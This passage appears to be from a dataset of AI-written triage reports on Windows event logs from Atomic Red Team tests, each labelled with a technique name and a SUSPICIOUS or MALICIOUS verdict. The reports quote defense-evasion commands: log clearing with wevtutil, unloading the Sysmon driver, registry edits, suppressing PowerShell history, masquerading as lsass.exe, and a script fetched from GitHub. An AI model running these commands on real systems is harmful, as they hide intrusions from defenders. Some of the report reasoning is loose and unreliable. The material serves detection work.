   - There are multiple entries related to Microsoft Edge Update processes. The process creation and execution of Edge Update with various switches (`/update`, `/regsvc`, `/regserver`, etc.) appear normal and consistent with routine updates for Microsoft Edge. These events do not indicate malicious activity.

**Assessment and Guidance:**

- **Resolution: SUSPICIOUS**
  - The simultaneous clearing of multiple event logs using `wevtutil.exe` by the user ""admin_test"" in combination with high-integrity commands suggests potentially unauthorized or illicit activity.
  - While the majority of the other activities (such as Edge updates) appear benign and expected, the tampering with event logs warrants further investigation to determine if there was any unauthorized access or other undesired actions performed on the system.

**Next Steps:**
1. **Investigate User Activities:** Evaluate other activities by the user ""admin_test"" around the date and time of the log-clearing incidents. Check for unauthorized logins or privileges granted.
2. **Review System State:** Inspect any configurations, scheduled tasks, or additional evidence that could provide context to these actions.
3. **Increase Monitoring:** Implement enhanced logging and alert mechanisms on critical systems to capture similar future activities.
4. **Conduct Security Audit:** A broader security audit may be beneficial to determine if any other systems have been tampered with or are compromised."
Unload Sysmon Filter Driver,"Upon thorough analysis of the provided Windows event logs, we can identify several key observations:

1. **Event Clearing:** 
   - Multiple logs (Sysmon, Application, System, Security) show evidence that logs have been cleared at the same time (Event IDs for log clear: 104 in System log, 1102 in Security log). Clearing logs, especially across multiple log types, without a legitimate administrative reason is a red flag for potential malicious activity. This is often done to hide tracks.

2. **Process Activity and Command-Line Usage:**
   - We observe numerous processes executing commands that interact directly with the system's filters and event logs. Specifically, the execution of `wevtutil.exe` with the command line `cl` (clear log) for multiple logs like System, Security, Application, and Windows PowerShell indicates an intentional attempt to clear logs.
   - The use of `cmd.exe` with commands such as `fltmc.exe unload SysmonDrv` is particularly suspicious. Unloading `SysmonDrv` (the Sysmon driver) can be used to hinder event logging and is typical of activity aiming to avoid detection.

3. **Unauthorized Privilege Use:**
   - The processes `wevtutil.exe`, `whoami.exe`, `hostname.exe`, and others such as `svchost.exe` are seen running under `SERVER002\\admin_test`, a user account, which also cleared the logs.

4. **Timestamps:**
   - The logs show a quick succession of suspicious activities around the same timestamp (08:05:11 to 08:05:21). This burst of activity suggests automated or highly coordinated manual action, commonly seen in active threat scenarios.

5. **Time Manipulation:**
   - There is evidence of time changes (Security Event ID 4616), which can correlate with methods to confuse log timelines and hinder forensic analysis.

Based on these observations, we can conclude that these logs indicate an attempt at malicious activity, particularly with the log clearing and Sysmon driver unload, which relate to efforts to cover up tracks commonly associated with system compromise. 

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected host(s) from the network to prevent potential lateral movement.
- Conduct a full and detailed forensic investigation on the host and associated network systems to ascertain the extent of the breach and ensure no backdoors or additional compromise exists.
- Examine network logs and flows to identify any exfiltration of data or communication with known malicious IPs.
- Reset or disable affected user accounts and credentials involved.
- Review and update security configurations, including re-enabling and monitoring logs and Sysmon operations.
- Evaluate and deploy enhanced security measures such as endpoint detection and response solutions to prevent similar incidents in the future."
Service Registry Permissions Weakness,"Based on a comprehensive analysis of the collected logs from the Windows host, several indicators suggest suspicious activity that needs further investigation:

### Suspicious/Anomalous Behavior Identified:

1. **PowerShell Activity:**
   - There are multiple PowerShell events indicating the execution of commands to get ACLs (Access Control Lists) on registry paths associated with Windows services, including a specific path for ""weakservicename"". This could suggest reconnaissance activity, potentially assessing weak service permissions.

2. **Log Clearance Activity:**
   - Evidence from the Sysmon logs and Security logs shows that the `wevtutil` command was used to clear multiple event logs (""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Windows PowerShell""). The use of `wevtutil` to clear logs is a common practice to evade detection, often associated with malicious behavior.

3. **Time Change Event:**
   - The Security and System logs indicate the system time was changed by the `svchost.exe` process. Altering the system time can be used to manipulate timestamps in log files, potentially to obscure malicious activities.

4. **Usage of Elevated Privileges:**
   - Many operations in the logs, including the PowerShell commands, are executed under the high integrity level indicating administrative permissions. Additionally, the actions are performed under the ""admin_test"" account with elevated privileges.

5. **Service Executions:**
   - There are numerous system-level processes starting and stopping, including `svchost.exe`, `sppsvc.exe`, and `WmiPrvSE.exe`, which all run under important system accounts (NT AUTHORITY\SYSTEM, NETWORK SERVICE). While individually, these might be normal, in conjunction with log clearance and ACL enumeration, they raise suspicion.

6. **Microsoft Edge Update Activity:**
   - The application logs show extensive activity related to Microsoft Edge Update, with several executions of both the update service and related installers. On its own, this might be benign, but it coincides with other suspicious activities and could merit a deeper look for potential abuse.

### Conclusion:
While the identified activities might individually represent normal system operations, the combination of PowerShell commands checking registry permissions, log clearance using `wevtutil`, and time changes strongly suggests efforts to cover tracks—common signs of an intrusion.

### Resolution:
- **SUSPICIOUS:** Although definitive evidence of malicious activity requires further forensic investigation, the presence of suspicious log clearance, registry enumeration using PowerShell with administrative context, and system time alterations require immediate attention. These actions could be indicative of malicious behavior such as privilege escalation, reconnaissance, or post-exploitation cleanup.

### Guidance on How to Proceed:
1. **Conduct a Forensic Investigation:**
   - Perform a deeper forensic investigation into processes and network activity that took place during the logged period.
   - Retrieve and analyze deleted or cleared logs if possible using recovery techniques or backup systems.

2. **User Review:**
   - Review recent activities and network interactions of the `admin_test` user account, including potential lateral movement or external connections.

3. **Verify System Integrity:**
   - Check for unauthorized changes or installations on the system, particularly related to service binaries and registry changes.

4. **Security Measures:**
   - Increase monitoring for this host and potentially similar activities across the network.
   - Consider endpoint detection and response (EDR) solutions to monitor real-time diagnostic data and detect potentially malicious activities.

5. **Patch and Update:**
   - Ensure all software, especially Microsoft Edge and related services, is up-to-date to mitigate known vulnerabilities.

This plan should mitigate potential risks associated with the suspicious activities observed and help in confirming whether malicious activity occurred."
Clear Event Logs via VBA,"Based on the analysis of the provided logs, several indicators of potential malicious activity have been identified that warrant further attention:

1. **Log Clearing Activity**:
   - The security log (Event ID 1102) indicates that the Windows Security log was cleared by a user with the username `admin_test`. This user also cleared the System (Event ID 104) and Windows PowerShell event logs during the same timeframe. Clearing event logs is a suspicious activity as it can be an attempt to cover tracks after unauthorized or malicious activities have occurred.

2. **PowerShell Command Execution**:
   - A PowerShell script was executed with a command-line (as seen in the PowerShell log entries) that includes downloading and executing a script from a GitHub repository (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`). This kind of external script execution can be used for malicious purposes, especially if targeting specific vulnerabilities (in this case, `Invoke-Maldoc -macroFile ... -sub ""ClearLogs""`). 

3. **Process Execution**:
   - The Sysmon logs indicate the execution of PowerShell and other system utilities like `wevtutil.exe` to clear log files, which align with the suspicious log clearing activities mentioned earlier. The specific command `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational` is explicitly for clearing Sysmon logs.

In summary, these activities, especially clearing logs via `wevtutil.exe` and executing potentially malicious PowerShell scripts from an external source, strongly suggest intentional obfuscation and unauthorized actions that are commonly tied to malicious intent.

**Resolution**: MALICIOUS

**Guidance on how to proceed**:
- Immediately isolate the affected host (Server002) from the network to prevent any further unauthorized access or data exfiltration.
- Conduct a forensic analysis of the host to understand the full scope of the compromise, focusing on file integrity, registry changes, and any additional persistence mechanisms.
- Reset credentials for `admin_test` and review audit logs for any signs of account misuse or lateral movement.
- Implement monitoring to detect similar activities in other parts of your environment and consider enhancing security measures such as application whitelisting and stricter PowerShell execution policies.

These steps will help to manage the incident and prevent further potential threats."
Masquerading as Windows LSASS process,"Upon reviewing the logs, I have identified several key events and sequences that warrant attention:

1. **Event Log Clearing (Event ID 1102)**:
   - The Security, System, and PowerShell event logs appear to have been cleared (evidenced by the `wevtutil.exe` command-line operations and Sysmon Event ID 1), carried out by the user `admin_test`.
   - This action is often associated with malicious activity to remove traces of an attack or unauthorized activity.

2. **Suspicious Process Execution**:
   - There are command-line executions involving the copying and execution of `cmd.exe` as `lsass.exe` in the `C:\Windows\Temp` directory. This is a common tactic to obfuscate or gain elevated privileges illicitly.

3. **Credential Access and Privilege Escalation (Event IDs 5379, 4672)**:
   - Multiple attempts of credential access using `SERVER002$` and `admin_test` accounts.
   - Elevated privileges action recorded (Event ID 4672) with a comprehensive privilege list assigned, resembling a possible unauthorized privilege escalation event.

4. **Malicious Intent Indicators**:
   - The use of `CompatTelRunner.exe`, `cmd.exe`, and generic system utilities being invoked with atypical command line arguments.
   - The series of events around `wevtutil.exe` and sysadmin privileges suggests possible unauthorized maintenance of persistence.

5. **Edge Updates**:
   - Processes related to Microsoft Edge updates took place, which may not be inherently malicious but should be assessed to rule out masquerading.

6. **Failed Access Attempts**:
   - Multiple Event ID 5379 entries indicate failure in Microsoft account operations, which may imply attempted unauthorized access attempts or credential harvesting attempts. The return code 3221226021 (access denied) is recorded consistently.

**Assessment of Risks and Threats**:
- The logs exhibit indicators of potential malicious activity:
  - Log clearance, redundant legitimate processes executed by alternative/renamed process paths (`lsass.exe`), unexpected compiler directives, and credential-related security events suggest the system has been targeted by a motivated actor.
  - Credential access and management attempts, as well as sysadmin-level privileges obtained inappropriately, imply an ongoing risk to the user and system security.

**Guidance**:
- Immediate review of access permissions associated with user `admin_test`.
- A thorough forensic investigation, possibly through endpoint detection solutions, to uncover undisclosed malware or persistence mechanisms.
- Enhancement of logging and monitoring capabilities to detect further unauthorized access attempts.
- Execution of a comprehensive incident response plan, including user education targeting spear-phishing and social engineering defenses.

The conclusion based on available logs:

**Resolution: MALICIOUS**

It suggests a potential system breach with a high likelihood of further undetected malicious actions. Immediate containment, eradication, and recovery activities should be prioritized."
Set Custom AddToHistoryHandler to Avoid History File Logging,"Upon reviewing the provided logs, there are several points of interest that suggest potentially suspicious activity:

1. **Log Clearing Events**: 
    - The system log contains events with `EventID: 104` and the security log contains an event with `EventID: 1102`, both indicating that logs across different channels (System, Security, and Windows PowerShell) have been cleared by the user `admin_test`. Log clearing is a common tactic to evade detection after malicious actions.

2. **Sysmon Logs**:
    - Multiple executions of the `wevtutil.exe` utility suggest it was used in a loop to clear logs from various channels systematically (`wevtutil cl` commands for Sysmon, Application, Security, and Windows PowerShell logs). This is consistent with attempts to remove evidence of activity.
    - The `PowerShell` entry in Sysmon includes command line arguments designed to suppress logging of PowerShell command history (`Set-PSReadLineOption -AddToHistoryHandler { return $false }`), further attempting to obfuscate actions taken using PowerShell.
    - Frequent execution of `whoami.exe` and `hostname.exe` by the `admin_test` user within a short time frame could be part of reconnaissance activity.

3. **Process Executions**:
    - Various standard system utilities (`conhost.exe`, `whoami.exe`, `hostname.exe`) are invoked by `admin_test`, but these are not necessarily indicative of malicious behavior on their own without additional context.
    - The presence of Microsoft Edge Update activities seems normal as it aligns with auto-update processes and doesn't appear suspicious in this context.

Based on the logs, the most concerning activities are the systematic clearing of event logs and the usage of PowerShell to suppress command history logging, both executed by the same user account, `SERVER002\admin_test`. This behavior points towards an attempt to hide potentially malicious activity or to evade detection.

### Conclusion: SUSPICIOUS

The findings suggest the necessity for a deeper investigation into the `admin_test` account's recent activities, potential unauthorized access, and validation of administrative actions. Immediate steps should involve:

- Reviewing the security configuration for the `admin_test` account to ensure it is secured and intended usage is verified.
- Analyzing network traffic from `Server002` during and after these events for any further indicators of compromise.
- Conducting a full sweep for signs of advanced threats or malware that might have been involved in invoking these actions.
- Implementing tight monitoring on all log activity and potentially reverting to a backup prior to log clearing if necessary for investigative purposes.

Further investigations may confirm or dismiss initial concerns. If further suspicious activities are discovered, the situation may need to be re-categorized as malicious."
Disable Windows LogOff Button,"After conducting a detailed analysis of the provided Windows event logs, several observations can be made regarding potential suspicious or malicious activity on the host ""Server002.""

### Analysis

1. **Repeated Use of `wevtutil.exe`:**
   - The `wevtutil.exe` utility is used numerous times in the logs. This tool is natively used to query and manage event logs. 
   - Observed instances such as:
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx""`
   - Usage of `wevtutil` to clear or export logs can indicate an attempt to remove traces of malicious activity.

2. **Registry Modifications:**
   - Log entries indicate modifications to the registry using `cmd.exe` and `reg.exe`:
     - `cmd.exe` involves commands to modify registry entries related to user interface policies.
     - Example command: 
       - `""cmd.exe\"" /c reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v NoLogOff /t REG_DWORD /d 1 /f & reg add \""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"" /v StartMenuLogOff /t REG_DWORD /d 1 /f""`
   - User policies related to ""NoLogOff"" and ""StartMenuLogOff"" are suspicious if not part of legitimate system administration activity.

3. **Events Logs Cleared:**
   - Security and System logs show events with ID `1102` and `104`, respectively, indicating that logs have been cleared.
   - User `admin_test` was responsible for clearing logs:
     - This could suggest an attempt to hide evidence of unauthorized activities.

4. **Use of High Integrity Commands:**
   - Many processes were executed with high integrity level, indicative of administrative privileges.

5. **Presence of NT AUTHORITY\SYSTEM:**
   - Multiple legitimate system processes were executed under `NT AUTHORITY\SYSTEM`, which, under normal circumstances, is expected. However, this coupled with other suspicious behavior could be an attempt to escalate privileges or execute unauthorized commands as SYSTEM.

### Conclusion:

The logs contain several indicators that suggest suspicious activity, particularly the manipulation of system configurations via the registry, potential covering of tracks by log clearance, and the frequency of potentially suspicious command-line executions by an administrative user.

### Resolution:
- **SUSPICIOUS**: The logs contain activity that requires further investigation. There is suspicious behavior potentially indicative of malicious activities, such as privilege escalation attempts, possible attempts to cover tracks through log clearance, and unauthorized registry modifications.

### Recommended Actions:
1. **Conduct a Full Security Audit:**
   - Investigate the intent and purpose of the registry changes.
   - Cross-reference user `admin_test` actions with system administrators to confirm legitimacy.
   
2. **Isolate the Host:**
   - Take precautionary measures by isolating the host from the network to prevent potential spread of compromise.

3. **System and Security Logs:**
   - Recover cleared logs if possible, using log aggregation tools or backups to audit previous activities.

4. **Enhanced Monitoring:**
   - Increase monitoring of critical system changes, particularly those involving `admin_test` and high-integrity processes.

5. **User Access Review:**
   - Verify and audit existing user privileges and access controls on the host."
Extract binary files via VBA,"Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious activities:

1. **Log Clearing Events:**
   - The `System log` and `Security log` show multiple instances of the event with ID `104` and `1102`, indicating that logs have been cleared. The `admin_test` account on `Server002` performed these actions, which often suggests an attempt to cover tracks associated with malicious activities.

2. **Suspicious PowerShell Activity:**
   - The `Windows PowerShell log` entries highlight PowerShell script execution with the application of `Invoke-MalDoc.ps1`, a tool often used for downloading and executing malicious documents. The script is fetched directly from a GitHub repository related to the Atomic Red Team project, which is known for pen-test simulation tools including techniques for facilitating attacks.
   - The script reads and alters `.txt` file contents and involves a network request (`iwr` command) which might be used for fetching additional code or executing commands from a remote server.

3. **Sysmon Events and Process Execution:**
   - The `Sysmon log` shows execution of `wevtutil.exe` for clearing logs, which is consistent with the log clearing events observed. The logs indicate that this was done programmatically with command line ""cl"" operations for the `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell` logs.
   - Processes like `hostname.exe` and `whoami.exe`, generally benign, could have been used here as part of enumeration or preliminary checks performed by an attacker after gaining access.
   - The activity is executed under a high integrity level, which could mean that the attacker obtained high-level privileges.

4. **Unusual Timing and Context:**
   - The sequence of events, especially the rapid succession in which PowerShell is invoked and logs are cleared, alongside the profile of the tools used (wevtutil for clearing, and PowerShell script execution with network activity) underscore the possibility of compromise.

**Assessment and Resolution:**
- **Resolution:** MALICIOUS
- The logs convincingly indicate malicious activity, primarily due to the combination of log-clearing, script execution involving remote code retrieval and execution, and high privilege operations.

**Guidance on How to Proceed:**
1. **Immediate Steps:**
   - Disconnect `Server002` from the network to prevent further malicious activities and lateral movement.
   - Suspend the `admin_test` account or any suspicious accounts to halt unauthorized access.
   
2. **Forensic Investigation:**
   - Conduct a thorough forensic analysis of `Server002` to retrieve contents of any temporary files, network communication logs, and confirm the full extent of the compromise.
   - Recover potential evidence of malicious payloads from memory or disk if not overwritten.

3. **Prevention Measures:**
   - Conduct a review and hardening of PowerShell script execution policies, ensuring only signed scripts from trusted authorities are allowed.
   - Implement stricter logging practices and monitoring for event log clearance activities.
   - Ensure that high privilege accounts are closely monitored and employ least privilege principles where possible.

By addressing these activities and securing the network architecture, potential damage can be mitigated and future attacks deterred."
Bypass UAC using SilentCleanup task,"Based on the provided logs, several key observations can be made:

1. **Execution of ""wevtutil.exe"" Commands**: 
   - There are multiple instances of `wevtutil.exe` being executed with the command to clear event logs. For example:
     - `C:\Windows\system32\wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `C:\Windows\system32\wevtutil.exe cl Application`
     - `C:\Windows\system32\wevtutil.exe cl System`
     - `C:\Windows\system32\wevtutil.exe cl ""Windows PowerShell""`
   - These commands are used to clear event logs, which is a common tactic used by attackers to cover their tracks.

2. **Event Log Cleared Entries**: 
   - Security log shows `EventID 1102`, indicating the event log was cleared by the user `admin_test`.
   - System log contains `EventID 104` entries indicating system logs were cleared.

3. **Command Execution via ""cmd.exe""**:
   - Execution of a batch file from a temporary directory seen in the process `cmd.exe`:
     - `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1548.002\src\T1548.002.bat""`
   - This command implies the potential use of Atomic Red Team, which is often used for testing and simulating attacks, but execution of scripts from temporary directories can also be a sign of malicious activities.

4. **Use of ""whoami.exe"" and ""hostname.exe""**:
   - Execution of `whoami.exe` and `hostname.exe` which might be benign but can also be used by attackers to gather information about the system.

5. **High Integrity Level**:
   - Several processes, including `wevtutil.exe`, are executed with high integrity level, indicating elevated privileges which is necessary to clear logs, but inappropriate use of such privileges is concerning.

6. **Microsoft Edge Update Activity**:
   - There were multiple updates and installations related to Microsoft Edge, but these seem like regular update activities and are executed by `NT AUTHORITY\SYSTEM`.

Given the findings, the presence of `wevtutil.exe` being used to clear logs and the execution of a batch file from a temporary directory associated with potential test attack scenarios suggests that the behavior is:

- **SUSPICIOUS** - These activities are suspicious and warrant further investigation to determine the legitimacy of the actions or to identify any unauthorized user or potential malware conducting these actions.

**Guidance**:
- Verify the actions taken by the `admin_test` account and confirm if this was intended or sanctioned by the organization's IT policy.
- Investigate the source and intention behind the execution of the batch file from the `AtomicRedTeam` directory.
- Look for any other signs of unauthorized access or anomalies on the network or related systems.
- Consider implementing monitoring for processes looking to clear event logs, especially from non-standard user accounts."
Invoke HTML Application - Simulate Lateral Movement over UNC Path,"Based on the log entries provided, here's a detailed analysis of the events:

### Potentially Suspicious Activity

1. **PowerShell Execution**:
   - Multiple PowerShell events indicate execution of a potentially obfuscated or custom command (`Invoke-ATHHTMLApplication`) with utilization of `mshta.exe`. The `mshta.exe` executable is often used by attackers to execute malicious scripts from the command line silently in the background. The command line seen in the logs: `powershell.exe & {Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe}` suggests execution of scripts that might not be legitimate.
   
2. **Clearing of Logs**:
   - The System, Windows PowerShell, and Security logs were cleared by the user `admin_test`. This activity can be considered highly suspicious as attackers often clear event logs to cover their tracks after conducting malicious operations.

3. **Sysmon Log Entries**:
   - The recurring execution of `wevtutil.exe` to clear logs (`cl` command) and the export of logs (`epl` command) to a temporary location is another action that aligns with efforts to manipulate or hide log data. This further suggests an effort to remove traces of potentially malicious activity.
   - The use of `wevtutil.exe` to clear logs by `admin_test` indicates direct involvement or compromise of the account to facilitate these actions.
   
4. **Execution with Elevated Integrity Level**:
   - Processes executed at a high integrity level, including those tied to clearing logs and executing potentially suspicious commands, suggest the actions were performed with administrator privileges. This may indicate privilege escalation or misuse of privileged access.

### Assessment
This situation appears strongly indicative of malicious activity based on the combination of unauthorized use of system tools and the clearing of logs to hide potentially further actions. The specific PowerShell command used and the involvement of `mshta.exe` are known tactics within malware attack vectors, including fileless attacks. The clearing of logs by a specific account, especially involving security and PowerShell channels, is a major red flag in cybersecurity.

### Resolution
Given the serious nature of log clearing in conjunction with potentially malicious PowerShell scripts, the observed behavior is consistent with an active compromise. The actions are deliberate and suggest an intent to maintain stealth while engaging in potentially harmful activities on the system.

**Resolution: MALICIOUS**

### Recommended Actions
1. **Immediate Containment**: Isolate the affected server (Server002) to prevent potential lateral movements within the network.
2. **Forensic Investigation**: Deploy digital forensic procedures to recover any deleted logs and further examine suspicious activities. This should include a detailed analysis of memory dumps and file system artifacts.
3. **Credential Revocation**: Immediately revoke the credentials of the user `admin_test` and possibly all active sessions under this user. Investigate for potential compromise of credentials.
4. **Review and Strengthen Security Policies**: Evaluate and enhance security mechanisms like disabling unnecessary scripting engines (e.g., mshta), enforcing strict PowerShell script policies, enabling script block logging, and limiting admin privileges.
5. **Engage with IR Team**: Activate the Incident Response team to address compliance and communication procedures for potential data breaches."
Execution of HTA and VBS Files using Rundll32 and URL.dll,"### Detailed Analysis

Upon reviewing the provided Windows event logs, I have identified the following suspicious activities and potential indicators of compromise:

1. **Event Logs Clearing:**
   - **Security Event 1102**: This indicates that the security event log was cleared by the user `admin_test`. 
   - **System Event 104**: Similarly, the system and PowerShell logs were cleared by the same user. Clearing logs can be a sign of attempting to cover tracks, which is suspicious behavior.
   
2. **Unusual Command-Line Execution:**
   - In the Sysmon logs, there is an entry for the process `cmd.exe` executing with a command line that launches two `rundll32.exe` instances with suspicious URLs or file handlers. This is a common tactic used in living-off-the-land binaries (LOLBins) attacks to execute scripts or payloads:
     - `""cmd.exe /c rundll32.exe url.dll,OpenURL ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.011\src\index.hta"" & rundll32.exe URL.dll,FileProtocolHandler ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.011\src\akteullen.vbs""`
   - This appears to relate to testing or exploitation activity, specifically mimicking techniques often cataloged by adversary simulation frameworks like Atomic Red Team.

3. **Use of Atomic Red Team:**
   - The mention of Atomic Red Team (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam`) suggests this activity could be part of a security testing or adversary simulation exercise, especially given its open-source and standard usage in penetration testing.

4. **Time Change Events:**
   - Security Event 4616 indicates a change in system time executed by `LOCAL SERVICE`. While common system processes execute time change events, frequent modifications alongside other indicators might necessitate further scrutiny if they coincide with malicious activity.

5. **Process Activity and Integrity Levels:**
   - The processes executed (like `conhost.exe`, `wevtutil.exe`) initiate with high integrity levels in multiple entries indicating they run with elevated privileges, typical in administrative tasks but noteworthy if in tandem with other suspicious behavior.

### Assessment and Resolution

- **Threats/Indicators**: The clearing of event logs is a significant red flag, as it typically indicates an attempt to hide potentially malicious activity. Coupled with the suspicious command executions involving `rundll32.exe` using uncommon parameters, these point towards possible compromise or at least warrant a deeper investigation into the user's activity and intent.

- **Recommendation for Further Actions**:
  1. **Investigate 'admin_test' User**: Determine if this user account should have such privileges and investigate their recent activities and origins.
  2. **Examine Cleared Log Timing and Activities**: Check for other correlated activities from before the logs were cleared.
  3. **Audit Use of Atomic Red Team**: Verify if there's a sanctioned security or compliance test in progress.
  4. **Conduct Host and Network Forensics**: Review other logs and systems for signs of lateral movement or data exfiltration.
  5. **Employ Isolation or Quarantine Measures**: Depending on results, consider isolating the system to prevent further potential spread.

**Resolution: SUSPICIOUS**

The activity observed is highly suggestive of possible malicious conduct but could also be part of legitimate security testing. An immediate, thorough investigation is warranted to discern the intent and authenticity of these actions."
LOLBAS CustomShellHost to Spawn Process,"Upon analyzing the provided Windows event logs, a series of activities suggest a potential security concern:

1. **Clearing of Event Logs**: 
   - The logs indicate multiple instances of the event log being cleared. Specifically, the Event ID 104 in the System log shows that the System and Windows PowerShell logs were cleared by the user `SERVER002\admin_test`.
   - Similarly, Event ID 1102 in the Security log indicates that the Security log was also cleared.

   Clearing of event logs is often a sign of malicious activity aimed at removing traces of actions performed on the system, suggesting an attempt to obfuscate malicious behavior.

2. **Suspicious PowerShell Activity**: 
   - The PowerShell commands executed are highly suspicious. The `powershell.exe` process command line includes activities that involve checking for the existence of a directory, copying a suspicious executable `customshellhost.exe` to `C:\test`, and renaming `calc.exe` to `explorer.exe`.
   - Executing scripts with conditions and file operations, particularly involving executables, indicates potential malicious behavior. PowerShell is frequently used in attacks due to its powerful scripting capabilities.

3. **Suspect Custom Executable**:
   - The behavior where `calc.exe` is copied and renamed to `explorer.exe` raises potential concerns. Such actions could be indicative of binary masquerading techniques, efforts to disguise malicious software as legitimate applications.
   - The execution of `customshellhost.exe` is particularly concerning, as this is an unknown binary and not typically a standard part of the Windows ecosystem.

4. **Timeline Analysis**:
   - The sequence of cleared logs followed by PowerShell activity suggests an effort to perform potentially malicious changes while evading detection. The rapid execution of these actions on the system underscores the need for further investigation.

**Assessment**: 
Given the combination of cleared event logs and suspicious PowerShell activity involving potential binary manipulation, this behavior aligns with known tactics used in cyber attacks. The presence of logs being systematically cleared hints at an attempt to cover tracks following potentially malicious actions.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the affected system (Server002) from the network to prevent further potential spread or communication with any command and control infrastructure.
- Conduct a thorough forensic investigation, focusing on the binaries copied and any processes they might spawn.
- Scan the system for other indicators of compromise, such as unauthorized users, proposed changes in system files, or unexpected network connections.
- Review user permissions and consider requiring multi-factor authentication to increase security posture.
- Inform incident response teams to prepare for potential wider investigation, if this is part of a larger attack campaign."
InfDefaultInstall.exe .inf Execution,"Upon reviewing the provided logs, several points raise concerns and indicate potential suspicious activities:

### Anomalous and Suspicious Activities:
1. **Event Logs Clearing**: 
   - The security log entry with `EventID 1102` indicates that the Security log was cleared by the user `admin_test`.
   - Similarly, the system log contains `EventID 104` entries showing that the System and Windows PowerShell logs were cleared by the same user (`admin_test`). 
   - Clearing of logs without a valid administrative reason is generally considered suspicious as it might be an attempt to hide malicious activity.

2. **Wevtutil Execution**:
   - Multiple executions of `wevtutil.exe` (which is used to clear event logs) by the user `admin_test` with high integrity level further corroborate suspicious activity linked to log manipulation.

3. **InfDefaultInstall.exe**:
   - Execution of `InfDefaultInstall.exe` located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218\\src\\Infdefaultinstall.inf`).
   - The parent process is a command prompt which might indicate the execution is anomalous, especially given its association with AtomicRedTeam, which is a known attack simulation framework.

4. **Host and WhoAmI Executions**:
   - The running of `HOSTNAME.EXE` and `whoami.exe` processes which can be used to gather system information might also suggest reconnaissance behaviors.

5. **Suspicious Use of PowerShell**:
   - Although no explicit PowerShell log entries are provided, the execution of `powershell.exe` noted in the Sysmon log without a clear purpose within the context of this data might indicate attempted or executed administrative actions.

### Assessment and Conclusion:
The activities documented—particularly the clearing of event logs, use of tools located in temporary directories, and potential reconnaissance through system and user command utilization—indicate potentially malicious behavior rather than benign operations or tasks. The deletion of logs is a classic technique used to cover traces of unauthorized or malicious activities.

### Resolution:
- **Resolution: MALICIOUS**

### Guidance and Next Steps:
- An immediate review and analysis of the systems' current state should be conducted, focusing on potential backdoors or unauthorized changes made during this period.
- Conduct a deep forensic investigation on the user's activities (`admin_test`) to determine the full scope of activities they engaged in.
- Review and potentially isolate or reimage the impacted systems to ensure no persistence mechanisms remain.
- Assess the need for changes in access controls, such as review of administrative privileges, as well as potential augmentation of detection with enhanced logging and alerting for similar suspicious patterns.
- Report and document the incident in accordance with the organization's security incident response protocol."
Snake Malware Registry Blob,"Upon reviewing the provided Windows event logs, several points of interest and potential indicators of suspicious behavior have been identified:

1. **Log Clearing Activity**:
   - The security log shows an event (ID: 1102) indicating that the logs were cleared by the user ""admin_test"". This is often an indicator of malicious activity, as attackers frequently clear logs to hide their tracks after gaining unauthorized access (EventID: 1102, User: admin_test, ProcessId: 3804).
   - Similarly, system logs indicate multiple channels being cleared (EventID: 104) by ""admin_test"". This further corroborates the suspicious activity surrounding this user action.

2. **PowerShell Activity**:
   - There is a significant PowerShell script execution (EventID: 600) performing operations on the registry, creating a property named ""AtomicSnake"" with random bytes in the path `HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds`. This is indicative of potentially obfuscated or suspicious behavior, as legitimate administrative or maintenance activities rarely use such naming conventions or perform such actions without clear documentation or purpose.
   - The command executed by PowerShell appears to be creating potentially malicious artifacts in the Windows Registry, possibly as part of a procedure to establish persistence or hide malicious code.

3. **Command Line Utility Execution**:
   - We observe multiple executions of the `wevtutil.exe` utility with the ""cl"" command to clear event logs including Sysmon, Application, Security, System, and Windows PowerShell channels. This aligns with typical attempts to cover tracks on the system (Sysmon EventID: 1).
   - The use of `whoami.exe` and `hostname.exe` by the same user during this period further suggests reconnaissance activities by an attacker (Sysmon EventID: 1).

4. **Unusual Edge Update Activity**:
   - An event related to ""MicrosoftEdgeUpdate.exe"" running with system integrity (Sysmon EventID: 1) is seen. While not inherently suspicious in isolation, it’s notable in the context of other suspicious activities. The execution of update executables with system privileges could be leveraged for privilege escalation.

5. **Time Synchronization**:
   - There is a system time change captured (Security EventID: 4616), which could indicate an attempt to manipulate timestamps possibly to cover tracks. Although time changes can have legitimate reasons, within this context, it raises further suspicion.

**Assessment**:
The evidence of the log clearing activities by the user ""admin_test"", along with suspicious PowerShell scripts and system modifications, strongly indicates malicious behavior. The combination of clearing logs, executing potentially harmful scripts, and leveraging system tools for suspicious purposes is consistent with tactics used by adversaries to maintain persistence and evade detection.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate ""Server002"" from the network to prevent lateral movement or further exfiltration.
- Conduct a full malware scan and forensic analysis on ""Server002"".
- Review and secure user accounts, focusing on monitoring or resetting credentials for ""admin_test"".
- Review and potentially increase logging and monitoring policies to identify similar suspicious behavior in other systems.
- Conduct an audit for any potential data loss and inform stakeholders as required."
Regsvr32 Silent DLL Install Call DllRegisterServer,"### Detailed Analysis:

